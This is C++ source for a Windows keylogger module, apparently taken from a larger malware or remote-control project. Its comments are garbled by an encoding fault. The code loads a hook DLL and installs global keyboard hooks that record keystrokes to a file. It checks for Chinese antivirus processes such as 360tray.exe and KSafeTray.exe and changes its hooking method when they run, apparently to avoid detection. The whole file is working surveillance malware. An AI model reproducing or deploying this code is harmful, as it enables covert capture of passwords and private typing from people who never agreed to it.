// KeyLogExe.cpp : �������̨Ӧ�ó������ڵ㡣
//

/*===========================================================================
FileName:KeyBoardHook.cpp
Usage:KeyBoard Hook Class V1.2
������ �����������[F.S.T] 2005/10/08
��վ:http://www.wrsky.com
��Ȩ��ԭ��������
=============================================================================*/

#ifndef TRACE
#define TRACE __noop
#endif

#include "KeyLogExe.h"
#include "../MyCommon.h"
#include "../until.h"
#include <imm.h>
#include <atlbase.h>
#include <io.h>
#pragma comment(lib,"imm32.lib") 
//----------------------------------------------------------------------------
#define UPWORD 1       //��д״̬���
#define LOWWORD 0      //Сд״̬���
#define ShiftDown 1    //Shift�����±��
#define ShiftUp 0      //Shift��������
#define WM_KEYHOOK       WM_USER+100 //������Ϣ
#define WM_MSHOOK        WM_USER+101 //�����Ϣ
#define WM_KEYHOOK_CN    WM_USER+102 //֧������
#define WM_KEYHOOK_CN_EN WM_USER+103 //��Ӣ
#define WM_EXIT          WM_USER+104   //�����˳�
#define MAX_CN_STRING_LEN 128
#define KBHOOKTYPE_EN    1           //��ԭʼ��������
#define KBHOOKTYPE_CN    2           //���Ĺ���
#define KBHOOKTYPE_CN_EN 3           //��Ӣ��Ϲ���

#define KEY_LOG_RESULT_PATH    "key_log_result_file_path"
#define EN_OR_CN_HOOK_HANDLE   "en_or_cn_hook_handle"



HINSTANCE dll_lib = NULL;
TCHAR tchKeyLogResultFilePath[MAX_PATH];
BOOL g_bStop;

DWORD dwKeyBoardMainThreadID = -1;

DWORD g_dwKBMainThreadID = 0;


/*

//-----------------------------------------------------------------------------
char KeyName[][20]={   //������ʾ���ļ����б��ܹ�34��
"Tab","CapsLock","Enter","Shift","Ctrl","Alt","Backspace","Ins","Home","End","Pause","Break","PgUp","PgDn","Delete","NumLock","Left","Right","Down","Up","Left Windows","Esc","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"
};
char PutKeyName[][20]={ //������ʾ������������б��ܹ�34��
"Tab","CL","Enter","Sf","Cl","At","B-p","Is","Home","End","Ps","Bk","PU","PD","Del","NumL","Lt","Rt","Dn","Up","LtWin","Esc","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"
};
char    KeyOn[]={"~!@#$%^&*()_+{}|:\"<>?"};//�������¶�Ӧ�ַ����Ķ�Ӧ�����
char KeyUnder[]={"`1234567890-=[]\\;',./"};
//


-------*/

/*

char kl_filename[10][20]=
{
    "english.ime",
    "unispim.ime",
    "freewb.ime",
    "wingb.ime",
    "winpy.ime",
    "winzm.ime",
    "pintlgnt.ime",
    "winabc.ime",
    "winsp.ime",
    "surime.ime"
};
//
char kl_name[10][11]={//��Ӧ���뷨����
"<Ӣ������>",
"<�Ϲ�ƴ��>",
"<�������>",
"<��������>",
"<ȫƴ����>",
"<֣������>",
"<΢��ƴ��>",
"<����ABC>",
"<˫ƴ����>",
"<��ǿ����>"
};

*/

//









KeyBoardHookEx::KeyBoardHookEx()
{

	canlog=1;
	index=1;
	CNString[2]='\0';


	pHookHandle = NULL;



	HANDLE hCNString=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,MAX_CN_STRING_LEN,"CNString");
	HANDLE hWHandle=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,sizeof(DWORD),"MsgTime");

	HANDLE hHookHandle=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,sizeof(HHOOK),EN_OR_CN_HOOK_HANDLE);
	HANDLE hResultPath=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,MAX_PATH,KEY_LOG_RESULT_PATH);
	
	Sleep(100);

	bIsStart = FALSE;
	
}
//
KeyBoardHookEx::~KeyBoardHookEx()
{
	if(bIsStart)
	{
		Stop();
	}
	
}









//function 4:
int KeyBoardHookEx::InitLibrary(void){
  if(dll_lib==NULL) dll_lib=LoadLibrary(this->KBINFO.Dll_path);//����HOOK���ӿ�
  if(dll_lib==NULL){
   //TRACE("load library failed!\r\n");
   return 0;
   }
  else{
   //TRACE("load library ok!\r\n");
   return 1;
   }
}
//
void KeyBoardHookEx::RemoveLibrary(void)
{
  if(dll_lib) FreeLibrary(dll_lib);
  dll_lib = NULL;

}
//function 7:


//function 8:
int KeyBoardHookEx::Stop(void)
{
	
	if(!bIsStart)
	{
		return 0;
	}  
	
	
	
	Sleep(500);
	

	if(dll_lib!=NULL)
	{
		void (*dllStopProcessThread)();
		(FARPROC &)dllStopProcessThread=GetProcAddress(dll_lib,"dllStopProcessThread");
		if(dllStopProcessThread)
		{
			//TRACE("get dllStopProcessThread ok\r\n");
			dllStopProcessThread();

		} 

	}

	StopKeyBoardHook();    


	RemoveLibrary();
	dll_lib = NULL;

	bIsStart = FALSE;

	return 0;
}









//------------------------------------
int KeyBoardHookEx::StartKeyBoardHook()
{
	
	
	if(dll_lib==NULL)
	{
		return -1;

	}



	HANDLE hHookHandle=OpenFileMapping(FILE_MAP_WRITE,false,EN_OR_CN_HOOK_HANDLE); 

	pHookHandle=(HHOOK *)MapViewOfFile(hHookHandle,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);

	memset(pHookHandle,0,sizeof(HHOOK));

	//printf("��ʼ��ù��Ӿ��\n");

	if(NULL == pHookHandle)
	{
		
		//printf("��ù��Ӿ������\n");
		return -1;

	}


	   
	if(!MyCommon::IsServerStart("ctfmon")) //caodan
	{
	
	
		
		if (GetProcessID("360sd.exe")||
			GetProcessID("360tray.exe")||
			GetProcessID("ZhuDongFangYu.exe")||
			GetProcessID("KSafeTray.exe")
			)
		{
			
			
			HOOKPROC KBhookCn_deal= (HOOKPROC)GetProcAddress(dll_lib,"_KBhook_deal@12");
			if(!KBhookCn_deal)
			{
				//printf("KBhookCn_deal Ϊ��\n");
				return -1;

			}


			//TRACE("get KBhookCn_deal ok\r\n");



			if(pHookHandle!=NULL)
			{
				*pHookHandle=SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)KBhookCn_deal,GetModuleHandle(0),0);//����ԭʼ���̹���

				//printf("pHookHandle= %u\n",pHookHandle);
				//printf("������Ӣ�Ĺ���\n");
			}


			return 0;
		}
		

	}


	HOOKPROC KBhookCn_deal= (HOOKPROC)GetProcAddress(dll_lib,"_KBhookCnDeal@12");
	if(!KBhookCn_deal)
	{
		return -1;

	}


	//TRACE("get KBhookCn_deal ok\r\n");


	if(pHookHandle!=NULL)
	{    

		*pHookHandle=SetWindowsHookEx(WH_GETMESSAGE,(HOOKPROC)KBhookCn_deal,dll_lib,0);//����ȫ�ֹ���
		//printf("���������Ĺ���\n");

	}
	

	return 0;
}


int KeyBoardHookEx::StopKeyBoardHook()
{
	if(pHookHandle)
	{
		UnhookWindowsHookEx(*pHookHandle); //ж�ع���
		pHookHandle = NULL;
	}

	return 0;

}








/*


BOOL ReplaceDllFile(const TCHAR *srcFile,const TCHAR *replaceFile)
{
	if( (-1 == _access(srcFile,0)) && (-1 == _access(replaceFile,0)) )
	{
		//printf("ɶ��û��\n");
		return FALSE;
	}

	if(-1 != _access(replaceFile,0))
	{
		remove(srcFile);
		MoveFile(replaceFile,srcFile);
	
	}
	return TRUE;

}

*/


int KeyBoardHookEx::Start(const TCHAR *tchHookDllName,const TCHAR *tchResFilePath)
{

	if(bIsStart)
	{
		return 0;
	}

	int iRes = -1;
	TCHAR *pResultPath = NULL;
	
	bIsStart = TRUE;
	if(NULL == tchHookDllName)
	{
		
		goto FUNC_END;
	
	}

	if(strlen(tchResFilePath) <4) //��֤����C:/
	{
		
		goto FUNC_END;

	}



	HANDLE hResultPath = OpenFileMapping(FILE_MAP_WRITE,false,KEY_LOG_RESULT_PATH); 

	if(NULL == hResultPath)
	{
		
		goto FUNC_END;

	}
	pResultPath=(char *)MapViewOfFile(hResultPath,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
	if(NULL == pResultPath)
	{
		
		
		goto FUNC_END;
	}

	memset(pResultPath,0,MAX_PATH);

	strncpy(pResultPath,tchResFilePath,MAX_PATH);
	
	if(TCHAR(*(pResultPath + strlen(pResultPath) -1)) != '\\')
	{
		
		strcat(pResultPath,"\\");
	}




	memset(&KBINFO,0,sizeof(KEYBOARDINFO));



	strncpy(KBINFO.Dll_path,tchHookDllName,MAX_PATH);


	InitLibrary();



	if(dll_lib!=NULL)
	{
		int (*dllStartProcessThread)();
		(FARPROC &)dllStartProcessThread=GetProcAddress(dll_lib,"dllStartProcessThread");
		if(dllStartProcessThread)
		{
			//TRACE("get dllStartProcessThread ok\r\n");
			if(dllStartProcessThread() < 0)
			{
				goto FUNC_END;

			}

			if(StartKeyBoardHook() >= 0)
			{

				iRes = 0;
			}
		} 


	}




FUNC_END:

	if(iRes < 0)
	{
		
	
		RemoveLibrary();

		bIsStart = FALSE;
	}
	


	return iRes;
}



//##################################################KeyBoardHook#########


KeyBoardHook::KeyBoardHook()
{
	
	g_bStop = FALSE;
	hMainThread = NULL;
	bStart = FALSE;
	dwKeyBoardMainThreadID = -1;

}


KeyBoardHook::~KeyBoardHook()
{
	
	if(bStart)
	{
		Stop();
	}

}




DWORD WINAPI KeyBoardThreadWork(LPVOID lparam)
{

	dwKeyBoardMainThreadID = GetCurrentThreadId();

	g_dwKBMainThreadID = dwKeyBoardMainThreadID;

	stu_thread_param *pStuThreadParam = (stu_thread_param *)lparam;

	
	KeyBoardHookEx kbh;

	kbh.Start(pStuThreadParam->tchHookDllName,pStuThreadParam->tchResFilePath);



	MSG msg;



	while(GetMessage(&msg,0,0,0))
	{


		if(msg.message == WM_EXIT)
		{
			break;

		}

		TranslateMessage(&msg);
		DispatchMessage(&msg);

		if(g_bStop)
		{
			break;
		}
	
	}

	//printf("���̼�¼�߳��˳���\n");

	kbh.Stop();

	g_dwKBMainThreadID = 0;

	return 0;
}





int KeyBoardHook::Start(const TCHAR *tchHookDllName,const TCHAR *tchResFilePath)
{


	if(bStart)
	{
		return 0;
	}


	int iRes = -1;

	if(NULL == tchHookDllName || NULL == tchResFilePath)
	{
		goto START_FUNC_END;
	}

	memset(&stuThreadParam,0,sizeof(stu_thread_param));

	strncpy(stuThreadParam.tchHookDllName,tchHookDllName,MAX_PATH);
	strncpy(stuThreadParam.tchResFilePath,tchResFilePath,MAX_PATH);


	hMainThread = CreateThread(NULL,0,KeyBoardThreadWork,&stuThreadParam,0,NULL);

	if(NULL == hMainThread)
	{
		goto START_FUNC_END;
	}

	bStart = TRUE;
	iRes = 1;

START_FUNC_END:
	
	return iRes;


}





int KeyBoardHook::Stop(void)
{
	g_bStop = TRUE;

	
	PostThreadMessage(dwKeyBoardMainThreadID,WM_EXIT,NULL,NULL);

	Sleep(10);

	WaitForSingleObject(hMainThread,INFINITE);

	bStart = FALSE;
	g_bStop = FALSE;

	CloseHandle(hMainThread);
	hMainThread = NULL;

	//printf("���̼�¼EXֹͣ������\n");

	

	return 0;

}